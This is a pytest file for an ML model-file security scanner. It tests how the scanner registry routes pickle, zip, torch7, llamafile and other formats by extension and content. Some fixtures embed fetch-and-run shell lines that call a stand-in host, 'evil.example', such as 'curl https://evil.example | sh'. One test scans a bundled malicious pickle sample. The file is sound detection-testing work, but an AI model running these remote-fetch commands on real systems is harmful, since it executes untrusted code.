import bz2
import gzip
import io
import json
import lzma
import os
import pickle
import tarfile
import zipfile
from collections.abc import Callable
from pathlib import Path
from typing import Any, Literal

import pytest

from modelaudit.config.constants import SCANNABLE_MODEL_EXTENSIONS
from modelaudit.core import scan_file
from modelaudit.scanner_registry_metadata import (
    SCANNER_REGISTRY_METADATA,
    get_extension_format_map,
    get_registered_scanner_extensions,
)
from modelaudit.scanners import SCANNER_REGISTRY, ScannerRegistry, _registry, get_scanner_for_file
from modelaudit.scanners.archive_dispatch import _HEADER_FORMAT_TO_SCANNER_ID, _select_nested_scanner_id
from modelaudit.scanners.base import BaseScanner, IssueSeverity
from modelaudit.utils.file.detection import JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES
from tests.helpers import create_mock_pytorch_zip

TarWriteMode = Literal["w:gz", "w:bz2", "w:xz"]

_REPRESENTATIVE_SCANNER_IDS = [
    "pickle",
    "pytorch_zip",
    "keras_zip",
    "joblib",
    "skops",
    "compressed",
    "tar",
    "tf_savedmodel",
    "metadata",
    "manifest",
]


def _write_zip_archive(path: Path, entries: dict[str, bytes]) -> Path:
    with zipfile.ZipFile(path, "w") as archive:
        for entry_name, payload in entries.items():
            archive.writestr(entry_name, payload)
    return path


def _write_tar_archive(path: Path, mode: TarWriteMode) -> Path:
    payload = b"weights"
    with tarfile.open(path, mode) as archive:
        member = tarfile.TarInfo("weights.bin")
        member.size = len(payload)
        archive.addfile(member, io.BytesIO(payload))
    return path


def _write_safe_pickle(path: Path) -> Path:
    path.write_bytes(pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
    return path


def _write_gzip_joblib_pickle(path: Path) -> Path:
    path.write_bytes(gzip.compress(pickle.dumps({"weights": [1, 2, 3]}, protocol=4)))
    return path


def _write_gzip_r_serialized(path: Path, body: str) -> Path:
    with gzip.open(path, "wb") as stream:
        stream.write(f"RDX2\nX\n{body}".encode())
    return path


def _write_cntkv2(path: Path, include_structure: bool = True) -> Path:
    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
    structure = b" CompositeFunction primitive_functions " if include_structure else b""
    path.write_bytes(prefix + structure + b" inputs outputs ")
    return path


def _write_lightgbm(path: Path, valid: bool = True) -> Path:
    body = "tree=0\nversion=v4\nnum_class=1\n"
    if valid:
        body += (
            "num_tree_per_iteration=1\nmax_feature_idx=2\ntree_sizes=12\n"
            "num_leaves=2\nsplit_feature=0\nleaf_value=0.1 0.2\n"
        )
    path.write_text(body, encoding="utf-8")
    return path


def _assert_scanner_for_path(path: Path, expected_scanner_name: str) -> None:
    scanner_class = ScannerRegistry().get_scanner_for_path(str(path))

    assert scanner_class is not None
    assert scanner_class.name == expected_scanner_name


def test_scanner_registry_contains_all_scanners():
    """Test that the scanner registry contains all expected scanners or tracks failed loads."""
    # Check that all expected scanners are either loaded or in failed scanners
    scanner_classes = [cls.__name__ for cls in SCANNER_REGISTRY]
    failed_scanners = _registry.get_failed_scanners()

    # Core scanners that should always load (no heavy dependencies)
    core_scanners = [
        "PickleScanner",
        "PyTorchZipScanner",
        "SafeTensorsScanner",
        "PmmlScanner",
        "TensorFlowMetaGraphScanner",
        "CoreMLScanner",
        "MXNetScanner",
        "LlamafileScanner",
        "TorchServeMarScanner",
    ]

    for scanner in core_scanners:
        assert scanner in scanner_classes, f"Core scanner {scanner} should always be available"

    # ML framework scanners that may fail due to compatibility issues
    # Map scanner class names to their registry IDs for proper matching
    ml_scanners_map = {
        "TensorFlowSavedModelScanner": "tf_savedmodel",
        "KerasH5Scanner": "keras_h5",
        "OnnxScanner": "onnx",
        "TFLiteScanner": "tflite",
        "OpenVinoScanner": "openvino",
        "TensorRTScanner": "tensorrt",
        "PaddleScanner": "paddle",
    }

    for scanner_class, scanner_id in ml_scanners_map.items():
        scanner_available = scanner_class in scanner_classes
        scanner_failed = scanner_id in failed_scanners

        assert scanner_available or scanner_failed, (
            f"Scanner {scanner_class} (ID: {scanner_id}) should either be loaded or in failed scanners. "
            f"Loaded: {scanner_classes}, Failed: {list(failed_scanners.keys())}"
        )


def test_scanner_registry_instances():
    """Test that all scanners in the registry are subclasses of BaseScanner."""
    for scanner_class in SCANNER_REGISTRY:
        assert issubclass(scanner_class, BaseScanner)

        # Check that each scanner has the required class attributes
        assert hasattr(scanner_class, "name")
        assert hasattr(scanner_class, "description")
        assert hasattr(scanner_class, "supported_extensions")

        # Check that each scanner has the required methods
        assert hasattr(scanner_class, "can_handle")
        assert hasattr(scanner_class, "scan")


def test_scanner_registry_unique_names():
    """Test that all scanners in the registry have unique names."""
    scanner_names = [cls.name for cls in SCANNER_REGISTRY]

    # Check for duplicates
    assert len(scanner_names) == len(set(scanner_names)), "Duplicate scanner names found"


def test_scanner_registry_file_extension_coverage():
    """Test that the scanner registry covers all expected file extensions."""
    # Collect all supported extensions from all scanners
    all_extensions = []
    for scanner_class in SCANNER_REGISTRY:
        all_extensions.extend(scanner_class.supported_extensions)

    # Check that common model file extensions are covered
    # Only include extensions that we know are supported by the scanners
    common_extensions = [
        ".pkl",
        ".pickle",
        ".pt",
        ".pth",
        ".rds",
        ".dnn",
        ".cmf",
        ".t7",
        ".th",
        ".net",
        ".rknn",
        ".llamafile",
        ".h5",
        ".hdf5",
        ".keras",
        ".mlmodel",
        ".lgb",
        ".lightgbm",
        ".pb",
        ".meta",
        ".onnx",
        ".cbm",
        ".safetensors",
        ".msgpack",
        ".tflite",
        ".pdmodel",
        ".pdiparams",
        ".params",
        ".mar",
        ".engine",
        ".plan",
        ".trt",
        ".gz",
        ".bz2",
        ".xz",
        ".lz4",
        ".zlib",
    ]

    for ext in common_extensions:
        assert ext in all_extensions, f"Extension {ext} not covered by any scanner"


def test_scanner_registry_instantiation():
    """Test that all scanners in the registry can be instantiated."""
    for scanner_class in SCANNER_REGISTRY:
        # Should be able to instantiate with default config
        scanner = scanner_class()
        assert scanner.config == {}

        # Should be able to instantiate with custom config
        custom_config = {"test_option": "test_value"}
        scanner = scanner_class(config=custom_config)
        assert scanner.config == custom_config


def test_scanner_registry_graceful_fallback():
    """Test that scanner registry handles failed loads gracefully."""
    failed_scanners = _registry.get_failed_scanners()

    # If there are failed scanners, they should have error messages
    for scanner_id, error_msg in failed_scanners.items():
        assert isinstance(error_msg, str)
        assert len(error_msg) > 0
        assert scanner_id in error_msg or "numpy" in error_msg.lower() or "tensorflow" in error_msg.lower()

    # Registry should still function even with failed scanners
    assert len(SCANNER_REGISTRY) > 0, "Some scanners should still be available"


def test_numpy_compatibility_detection():
    """Test that NumPy compatibility status is properly detected."""
    numpy_compatible, numpy_status = _registry.get_numpy_status()

    assert isinstance(numpy_compatible, bool)
    assert isinstance(numpy_status, str)
    assert "numpy" in numpy_status.lower()

    # Should provide helpful information
    assert len(numpy_status) > 10


@pytest.mark.parametrize("scanner_id", _REPRESENTATIVE_SCANNER_IDS)
def test_representative_scanner_descriptors_match_scanner_class_metadata(scanner_id: str) -> None:
    """Pin descriptor/class metadata parity and explicit routing exceptions."""
    registry = ScannerRegistry()
    scanner_info = registry.get_scanner_info(scanner_id)
    scanner_class = registry.load_scanner_by_id(scanner_id)

    assert scanner_info is not None
    if scanner_class is None:
        assert scanner_id in registry.get_failed_scanners()
        return

    assert scanner_info["class"] == scanner_class.__name__
    assert scanner_info["description"] == scanner_class.description

    explicitly_routed_extensions = set(scanner_info["extensions"])
    scanner_extensions = set(scanner_class.supported_extensions)
    scanner_only_extensions = set(scanner_info.get("scanner_only_extensions", []))
    content_routed_extensions = set(scanner_info.get("content_routed_extensions", []))
    descriptor_extensions = explicitly_routed_extensions | content_routed_extensions

    assert scanner_extensions == explicitly_routed_extensions | scanner_only_extensions
    assert not (scanner_only_extensions & explicitly_routed_extensions)
    assert not (scanner_only_extensions & content_routed_extensions)
    assert content_routed_extensions <= descriptor_extensions


@pytest.mark.parametrize("scanner_id", sorted(SCANNER_REGISTRY_METADATA))
def test_scanner_descriptors_match_class_extension_metadata(scanner_id: str) -> None:
    """All direct descriptor extensions must match the scanner class contract."""
    registry = ScannerRegistry()
    scanner_info = registry.get_scanner_info(scanner_id)
    scanner_class = registry.load_scanner_by_id(scanner_id)

    assert scanner_info is not None
    if scanner_class is None:
        assert scanner_id in registry.get_failed_scanners()
        return

    explicitly_routed_extensions = set(scanner_info["extensions"])
    scanner_only_extensions = set(scanner_info.get("scanner_only_extensions", []))
    content_routed_extensions = set(scanner_info.get("content_routed_extensions", []))
    scanner_extensions = set(scanner_class.supported_extensions)

    assert scanner_extensions == explicitly_routed_extensions | scanner_only_extensions
    assert not (scanner_only_extensions & explicitly_routed_extensions)
    assert not (scanner_only_extensions & content_routed_extensions)
    assert not (content_routed_extensions & explicitly_routed_extensions)


def test_extension_format_map_is_backed_by_scanner_descriptors() -> None:
    """Extension-only validation policy must stay inside scanner metadata."""
    extension_format_map = get_extension_format_map()
    registered_extensions = get_registered_scanner_extensions()
    registry = ScannerRegistry()

    assert set(extension_format_map) <= registered_extensions
    for extension, extension_format in extension_format_map.items():
        assert registry.get_scanner_id_for_header_format(extension_format) is not None, (
            f"{extension} maps to unresolved format {extension_format}"
        )


def test_extension_format_map_excludes_ambiguous_routable_extensions() -> None:
    """Generic routed extensions should not become authoritative type claims."""
    extension_format_map = get_extension_format_map()

    assert ".json" not in extension_format_map
    assert ".yaml" not in extension_format_map
    assert ".txt" not in extension_format_map
    assert ".model" not in extension_format_map
    assert ".exe" not in extension_format_map
    assert ".joblib" not in extension_format_map


def test_scannable_model_extensions_are_registry_backed() -> None:
    """Source-download filters should not carry an independent scanner list."""
    assert frozenset(get_registered_scanner_extensions()) == SCANNABLE_MODEL_EXTENSIONS


def test_archive_dispatch_header_map_is_backed_by_scanner_descriptors() -> None:
    """Nested archive dispatch should consume scanner-owned header aliases."""
    for scanner_id, scanner_info in SCANNER_REGISTRY_METADATA.items():
        expected_keys = {scanner_id, *(str(header_format) for header_format in scanner_info.get("header_formats", ()))}
        actual_keys = {
            header_format
            for header_format, mapped_scanner_id in _HEADER_FORMAT_TO_SCANNER_ID.items()
            if mapped_scanner_id == scanner_id
        }
        assert actual_keys == expected_keys


def test_select_nested_scanner_id_routes_compressed_joblib_members(tmp_path: Path) -> None:
    member_path = _write_gzip_joblib_pickle(tmp_path / "nested.joblib")

    assert _select_nested_scanner_id(str(member_path)) == "joblib"


@pytest.mark.parametrize("suffix", [".rds", ".rda", ".rdata"])
def test_select_nested_scanner_id_routes_compressed_r_serialized_members(tmp_path: Path, suffix: str) -> None:
    member_path = _write_gzip_r_serialized(tmp_path / f"workspace{suffix}", "workspace\nmodel")

    assert _select_nested_scanner_id(str(member_path)) == "r_serialized"


def test_select_nested_scanner_id_does_not_route_compressed_non_target_suffix_to_r_serialized(
    tmp_path: Path,
) -> None:
    member_path = _write_gzip_r_serialized(tmp_path / "workspace.txt", "workspace\nmodel")

    assert _select_nested_scanner_id(str(member_path)) != "r_serialized"


@pytest.mark.parametrize(
    ("header_format", "scanner_id"),
    [
        ("pickle", "pickle"),
        ("protobuf", "tf_savedmodel"),
        ("tensorflow_directory", "tf_savedmodel"),
        ("hdf5", "keras_h5"),
        ("keras", "keras_h5"),
        ("gguf", "gguf"),
        ("ggml", "gguf"),
        ("compressed", "compressed"),
    ],
)
def test_get_scanner_id_for_header_format_resolves_descriptor_owned_routes(
    header_format: str,
    scanner_id: str,
) -> None:
    registry = ScannerRegistry()

    assert registry.get_scanner_id_for_header_format(header_format) == scanner_id
    assert registry._loaded_scanners == {}


@pytest.mark.parametrize(
    ("suffix", "expected_scanner_name"),
    [
        (".pt", "pytorch_zip"),
        (".pth", "pytorch_zip"),
        (".ckpt", "pytorch_zip"),
        (".bin", "pytorch_zip"),
        (".pkl", "pytorch_zip"),
    ],
)
def test_get_scanner_for_path_preserves_zip_backed_pytorch_suffix_collision_dispatch(
    tmp_path: Path,
    suffix: str,
    expected_scanner_name: str,
) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / f"model{suffix}")

    _assert_scanner_for_path(model_path, expected_scanner_name)


@pytest.mark.parametrize(
    ("suffix", "expected_scanner_name"),
    [
        (".pt", "pickle"),
        (".pth", "pickle"),
        (".ckpt", "pickle"),
        (".pkl", "pickle"),
    ],
)
def test_get_scanner_for_path_routes_raw_pickle_torch_suffixes_to_pickle(
    tmp_path: Path,
    suffix: str,
    expected_scanner_name: str,
) -> None:
    model_path = _write_safe_pickle(tmp_path / f"model{suffix}")

    _assert_scanner_for_path(model_path, expected_scanner_name)


@pytest.mark.parametrize("protocol", [1, 4])
def test_get_scanner_for_path_keeps_torch_marker_pickle_on_pickle_scanner(tmp_path: Path, protocol: int) -> None:
    model_path = tmp_path / "marker-checkpoint.pt"
    model_path.write_bytes(pickle.dumps({"weights": b"\x00torch.FloatTensor nn.Sequential"}, protocol=protocol))

    _assert_scanner_for_path(model_path, "pickle")


def test_get_scanner_for_path_keeps_pickle_with_appended_ascii_torch7_header_on_pickle_scanner(tmp_path: Path) -> None:
    model_path = tmp_path / "appended-header.pt"
    model_path.write_bytes(
        pickle.dumps({"weights": [1, 2, 3]}, protocol=4)
        + b"4\n1\n3\nV 1\n13\nnn.Sequential\n4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
    )

    _assert_scanner_for_path(model_path, "pickle")


def test_get_scanner_for_path_routes_marker_form_torch7_pt_to_torch7(tmp_path: Path) -> None:
    model_path = tmp_path / "marker-checkpoint.pt"
    model_path.write_bytes(b"\x01\x00torch.FloatTensor nn.Sequential os.execute('curl https://evil.example | sh')\n")

    _assert_scanner_for_path(model_path, "torch7")


def test_get_scanner_for_path_routes_raw_bin_payload_to_pytorch_binary(tmp_path: Path) -> None:
    model_path = tmp_path / "model.bin"
    model_path.write_bytes(b"\x00" * 128)

    _assert_scanner_for_path(model_path, "pytorch_binary")


def test_get_scanner_for_path_routes_misnamed_keras_zip_by_content(tmp_path: Path) -> None:
    model_path = _write_zip_archive(
        tmp_path / "model.zip",
        {
            "config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8"),
            "metadata.json": json.dumps({"keras_version": "3.0.0"}).encode("utf-8"),
        },
    )

    _assert_scanner_for_path(model_path, "keras_zip")


def test_get_scanner_for_path_routes_generic_zip_without_keras_markers_to_zip(tmp_path: Path) -> None:
    model_path = _write_zip_archive(
        tmp_path / "generic.zip",
        {"config.json": json.dumps({"model_type": "bert"}).encode("utf-8")},
    )

    _assert_scanner_for_path(model_path, "zip")


def test_get_scanner_for_path_routes_misnamed_skops_zip_by_schema_content(tmp_path: Path) -> None:
    model_path = _write_zip_archive(
        tmp_path / "model.zip",
        {
            "schema.json": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "_skops_version": "0.11.0",
                    "content": {},
                }
            ).encode("utf-8"),
        },
    )

    _assert_scanner_for_path(model_path, "skops")


def test_get_scanner_for_path_routes_generic_zip_without_skops_markers_to_zip(tmp_path: Path) -> None:
    model_path = _write_zip_archive(
        tmp_path / "generic.zip",
        {
            "schema.json": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "content": {},
                }
            ).encode("utf-8"),
        },
    )

    _assert_scanner_for_path(model_path, "zip")


def test_get_scanner_for_file_routes_over_entry_zip_before_specialized_zip_probes(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = _write_zip_archive(
        tmp_path / "over-entry.zip",
        {"one.txt": b"one", "two.txt": b"two"},
    )

    def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
        raise AssertionError("specialized routing must not materialize an over-limit ZIP directory")

    monkeypatch.setattr(zipfile, "ZipFile", fail_zipfile_open)

    scanner = get_scanner_for_file(str(model_path), config={"max_zip_entries": 1})

    assert scanner is not None
    assert scanner.name == "zip"


def test_get_scanner_for_file_honors_selection_before_zip_preflight(tmp_path: Path) -> None:
    model_path = _write_zip_archive(
        tmp_path / "selected-pickle.zip",
        {"one.txt": b"one", "two.txt": b"two"},
    )

    scanner = get_scanner_for_file(
        str(model_path),
        config={"scanners": ["pickle"], "max_zip_entries": 1},
    )

    assert scanner is None


def test_get_scanner_for_file_honors_numpy_route_before_plain_zip_preflight(tmp_path: Path) -> None:
    model_path = _write_zip_archive(
        tmp_path / "selected-numpy.zip",
        {"one.txt": b"one", "two.txt": b"two"},
    )

    scanner = get_scanner_for_file(
        str(model_path),
        config={"scanners": ["numpy"], "max_zip_entries": 1},
    )

    assert scanner is None


def test_get_scanner_for_file_routes_disguised_rar_by_header(tmp_path: Path) -> None:
    """Public helper routing should honor RAR magic even without a .rar suffix."""
    path = tmp_path / "archive.payload"
    path.write_bytes(b"Rar!\x1a\x07\x01\x00" + b"\x00" * 32)

    scanner = get_scanner_for_file(str(path))

    assert scanner is not None
    assert scanner.name == "rar"


def test_get_scanner_for_file_rejects_rar_suffix_without_magic(tmp_path: Path) -> None:
    path = tmp_path / "not_really.rar"
    path.write_text("plain text, not a RAR archive\n", encoding="utf-8")

    scanner = get_scanner_for_file(str(path))

    assert scanner is None


def test_get_scanner_for_file_routes_hdf5_header_alias_under_misleading_suffix(tmp_path: Path) -> None:
    path = tmp_path / "model.jpg"
    path.write_bytes(b"\x89HDF\r\n\x1a\n" + b"\x00" * 32)

    scanner = get_scanner_for_file(str(path))

    assert scanner is not None
    assert scanner.name == "keras_h5"


def test_get_scanner_for_file_routes_ggml_header_alias_and_rejects_near_match(tmp_path: Path) -> None:
    path = tmp_path / "model.jpg"
    path.write_bytes(b"GGML" + (1).to_bytes(4, "little") + b"\x00" * 24)
    near_match = tmp_path / "not-model.jpg"
    near_match.write_bytes(b"GGMX" + (1).to_bytes(4, "little") + b"\x00" * 24)

    scanner = get_scanner_for_file(str(path))

    assert scanner is not None
    assert scanner.name == "gguf"
    assert get_scanner_for_file(str(near_match)) is None


def test_get_scanner_for_file_does_not_override_r_serialized_suffix_with_compressed_alias(tmp_path: Path) -> None:
    path = tmp_path / "not-r.rds"
    path.write_bytes(gzip.compress(pickle.dumps({"weights": [1, 2, 3]}, protocol=4)))

    assert get_scanner_for_file(str(path)) is None


def test_get_scanner_for_path_preserves_r_serialized_owner_after_failed_zip_probe(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = _write_gzip_r_serialized(tmp_path / "workspace.rds", "workspace\nmodel")

    def raise_zip_error(_path: str) -> bool:
        raise OSError("simulated ZIP probe read failure")

    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_zip_error)

    scanner_class = ScannerRegistry().get_scanner_for_path(str(path))

    assert scanner_class is not None
    assert scanner_class.name == "r_serialized"


def test_get_scanner_for_path_routes_valid_mar_archive_to_torchserve_mar(tmp_path: Path) -> None:
    mar_path = _write_zip_archive(
        tmp_path / "model.mar",
        {
            "MAR-INF/MANIFEST.json": json.dumps(
                {"model": {"handler": "handler.py", "serializedFile": "model.bin"}}
            ).encode("utf-8"),
            "handler.py": b"def handle(data, context):\n    return data\n",
            "model.bin": b"weights",
        },
    )

    _assert_scanner_for_path(mar_path, "torchserve_mar")


def test_get_scanner_for_path_routes_non_torchserve_mar_zip_to_zip(tmp_path: Path) -> None:
    mar_path = _write_zip_archive(tmp_path / "invalid.mar", {"weights.bin": b"weights"})

    _assert_scanner_for_path(mar_path, "zip")


def test_get_scanner_for_path_routes_joblib_extension_to_joblib_before_pickle_fallback(tmp_path: Path) -> None:
    joblib_path = _write_safe_pickle(tmp_path / "weights.joblib")

    _assert_scanner_for_path(joblib_path, "joblib")


@pytest.mark.parametrize(
    ("filename", "mode"),
    [
        ("weights.tar.gz", "w:gz"),
        ("weights.tar.bz2", "w:bz2"),
        ("weights.tar.xz", "w:xz"),
    ],
)
def test_get_scanner_for_path_prefers_tar_for_compound_compressed_tar_wrappers(
    tmp_path: Path,
    filename: str,
    mode: TarWriteMode,
) -> None:
    archive_path = _write_tar_archive(tmp_path / filename, mode)

    _assert_scanner_for_path(archive_path, "tar")


@pytest.mark.parametrize(
    ("filename", "compressor"),
    [
        ("weights.pkl.gz", gzip.compress),
        ("weights.pkl.bz2", bz2.compress),
        ("weights.pkl.xz", lzma.compress),
    ],
)
def test_get_scanner_for_path_routes_standalone_compressed_wrappers_to_compressed(
    tmp_path: Path,
    filename: str,
    compressor: Callable[[bytes], bytes],
) -> None:
    wrapper_path = tmp_path / filename
    wrapper_path.write_bytes(compressor(pickle.dumps({"weights": [1, 2, 3]}, protocol=4)))

    _assert_scanner_for_path(wrapper_path, "compressed")


@pytest.mark.parametrize(
    "filename",
    ["README.md", "README.en.md", "README.rst", "model_card.md", "model_card.txt", "modelcard.md"],
)
def test_get_scanner_for_path_routes_suffixed_documentation_to_text_scanner(
    tmp_path: Path,
    filename: str,
) -> None:
    readme_path = tmp_path / filename
    readme_path.write_text("# Model Card\n\nSafe documentation.\n")

    _assert_scanner_for_path(readme_path, "text")


@pytest.mark.parametrize("filename", ["README.md.bak", "README.png"])
def test_get_scanner_for_path_does_not_route_readme_near_matches_to_text(
    tmp_path: Path,
    filename: str,
) -> None:
    readme_path = tmp_path / filename
    readme_path.write_text('requests.get("https://evil.example/payload")\n')

    scanner_class = ScannerRegistry().get_scanner_for_path(str(readme_path))

    assert scanner_class is None or scanner_class.name != "text"


@pytest.mark.parametrize("filename", ["README", "model_card"])
def test_get_scanner_for_path_routes_extensionless_documentation_to_text_scanner(
    tmp_path: Path,
    filename: str,
) -> None:
    readme_path = tmp_path / filename
    readme_path.write_text("# Model Card\n\nSafe documentation.\n")

    _assert_scanner_for_path(readme_path, "text")


def test_get_scanner_for_path_routes_misnamed_torch7_by_content(tmp_path: Path) -> None:
    torch7_path = tmp_path / "payload.jpg"
    torch7_path.write_bytes(b"4\n1\n3\nV 1\n13\nnn.Sequential\n4\n2\n3\nV 1\n17\ntorch.FloatTensor\n")

    _assert_scanner_for_path(torch7_path, "torch7")


@pytest.mark.parametrize("filename", ["payload.onnx", "payload.pt", "payload.gz", "payload.tar.gz"])
def test_get_scanner_for_path_prioritizes_torch7_over_recognized_suffix(tmp_path: Path, filename: str) -> None:
    torch7_path = tmp_path / filename
    torch7_path.write_bytes(b"4\n1\n3\nV 1\n13\nnn.Sequential\n4\n2\n3\nV 1\n17\ntorch.FloatTensor\n")

    _assert_scanner_for_path(torch7_path, "torch7")


def test_get_scanner_for_path_does_not_route_misnamed_torch_source_text(tmp_path: Path) -> None:
    source_path = tmp_path / "source.jpg"
    source_path.write_text("import torch\nimport torch.nn as nn\n\nclass Model(nn.Module):\n    pass\n")

    assert ScannerRegistry().get_scanner_for_path(str(source_path)) is None


def test_get_scanner_for_path_routes_extensionless_llamafile(tmp_path: Path) -> None:
    llamafile_path = tmp_path / "llama"
    llamafile_path.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime")

    _assert_scanner_for_path(llamafile_path, "llamafile")


def test_get_scanner_for_path_routes_extensionless_middle_marker_llamafile(tmp_path: Path) -> None:
    llamafile_path = tmp_path / "llama"
    llamafile_path.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"A" * (2 * 1024 * 1024 + 64)
        + b"llamafile runtime"
        + b"B" * (2 * 1024 * 1024 + 64)
    )

    _assert_scanner_for_path(llamafile_path, "llamafile")


def test_get_scanner_for_path_routes_extensionless_malicious_llamafile(tmp_path: Path) -> None:
    llamafile_path = tmp_path / "llama"
    llamafile_path.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
    )

    _assert_scanner_for_path(llamafile_path, "llamafile")


def test_get_scanner_for_path_routes_renamed_cntk_by_content(tmp_path: Path) -> None:
    renamed_cntk = _write_cntkv2(tmp_path / "cntk.jpg")

    _assert_scanner_for_path(renamed_cntk, "cntk")


def test_get_scanner_for_path_routes_renamed_lightgbm_by_content(tmp_path: Path) -> None:
    renamed_lightgbm = _write_lightgbm(tmp_path / "lightgbm.jpg")

    _assert_scanner_for_path(renamed_lightgbm, "lightgbm")


def test_get_scanner_for_path_does_not_route_cntk_or_lightgbm_near_matches(tmp_path: Path) -> None:
    cntk_near_match = _write_cntkv2(tmp_path / "cntk-near-match.jpg", include_structure=False)
    lightgbm_near_match = _write_lightgbm(tmp_path / "lightgbm-near-match.jpg", valid=False)

    assert ScannerRegistry().get_scanner_for_path(str(cntk_near_match)) is None
    assert ScannerRegistry().get_scanner_for_path(str(lightgbm_near_match)) is None


@pytest.mark.parametrize(
    ("filename", "scanner_name"),
    [
        ("unreadable.mlmodel", "coreml"),
        ("unreadable.safetensors", "safetensors"),
        ("unreadable.engine", "tensorrt"),
    ],
)
def test_get_scanner_for_path_routes_owned_binary_model_after_zip_probe_read_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    filename: str,
    scanner_name: str,
) -> None:
    unreadable_model = tmp_path / filename
    unreadable_model.write_bytes(b"simulated unavailable model bytes")

    def raise_read_error(_path: str) -> bool:
        raise OSError("simulated ZIP probe read failure")

    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_read_error)
    monkeypatch.setattr(
        "modelaudit.scanners.coreml_scanner.CoreMLScanner.can_handle",
        classmethod(lambda _cls, _path: True),
    )

    _assert_scanner_for_path(unreadable_model, scanner_name)


def test_get_scanner_for_path_routes_owned_metagraph_after_zip_probe_read_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unreadable_meta = tmp_path / "unreadable.meta"
    unreadable_meta.write_bytes(b"simulated metagraph bytes")

    def raise_read_error(_path: str) -> bool:
        raise OSError("simulated ZIP probe read failure")

    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_read_error)
    monkeypatch.setattr(
        "modelaudit.scanners.tf_metagraph_scanner.TensorFlowMetaGraphScanner.can_handle",
        classmethod(lambda _cls, _path: True),
    )

    _assert_scanner_for_path(unreadable_meta, "tf_metagraph")


def test_get_scanner_for_path_does_not_route_pickle_after_zip_probe_read_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unreadable_pickle = _write_safe_pickle(tmp_path / "unreadable.pkl")

    def raise_read_error(_path: str) -> bool:
        raise OSError("simulated ZIP probe read failure")

    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_read_error)

    assert ScannerRegistry().get_scanner_for_path(str(unreadable_pickle)) is None


def test_get_scanner_for_path_routes_misnamed_malicious_llamafile(tmp_path: Path) -> None:
    llamafile_path = tmp_path / "payload.jpg"
    llamafile_path.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
    )

    _assert_scanner_for_path(llamafile_path, "llamafile")


def test_get_scanner_for_path_prioritizes_llamafile_over_onnx_suffix(tmp_path: Path) -> None:
    llamafile_path = tmp_path / "payload.onnx"
    llamafile_path.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
    )

    _assert_scanner_for_path(llamafile_path, "llamafile")


def test_get_scanner_for_path_does_not_route_extensionless_llamafile_near_match(tmp_path: Path) -> None:
    generic_executable = tmp_path / "tool"
    generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")

    assert ScannerRegistry().get_scanner_for_path(str(generic_executable)) is None


def test_get_scanner_for_path_does_not_route_misnamed_llamafile_near_match(tmp_path: Path) -> None:
    generic_executable = tmp_path / "tool.jpg"
    generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")

    assert ScannerRegistry().get_scanner_for_path(str(generic_executable)) is None


@pytest.mark.parametrize("filename", ["README.md.bak", "model_card.tmp"])
def test_get_scanner_for_path_does_not_route_metadata_near_match_suffixes(
    tmp_path: Path,
    filename: str,
) -> None:
    metadata_near_match = tmp_path / filename
    metadata_near_match.write_text("# Safe near-match documentation.\n")

    scanner_class = ScannerRegistry().get_scanner_for_path(str(metadata_near_match))

    assert scanner_class is None or scanner_class.name != "metadata"


def test_get_scanner_for_path_routes_extensionless_readme_zip_to_zip_and_scans_payload(tmp_path: Path) -> None:
    evil_pickle = Path(__file__).parent.parent / "assets/samples/pickles/evil.pickle"
    disguised_readme = _write_zip_archive(tmp_path / "README", {"payload.pkl": evil_pickle.read_bytes()})

    _assert_scanner_for_path(disguised_readme, "zip")

    result = scan_file(str(disguised_readme))

    assert result.scanner_name == "zip"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_get_scanner_for_path_routes_model_manifest_json_to_manifest_scanner(tmp_path: Path) -> None:
    manifest_path = tmp_path / "config.json"
    manifest_path.write_text(json.dumps({"model_type": "bert", "architectures": ["BertModel"]}))

    _assert_scanner_for_path(manifest_path, "manifest")


def test_get_scanner_for_path_routes_confirmed_jax_json_before_manifest(tmp_path: Path) -> None:
    checkpoint_path = tmp_path / "state.json"
    checkpoint_path.write_text(json.dumps({"framework": "jax", "weights": [1, 2, 3]}), encoding="utf-8")

    _assert_scanner_for_path(checkpoint_path, "jax_checkpoint")


def test_get_scanner_for_path_keeps_oversized_ordinary_json_with_manifest(tmp_path: Path) -> None:
    manifest_path = tmp_path / "config.json"
    manifest_path.write_text(
        json.dumps(
            {
                "model_type": "ordinary",
                "padding": "x" * (JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES + 16),
            }
        ),
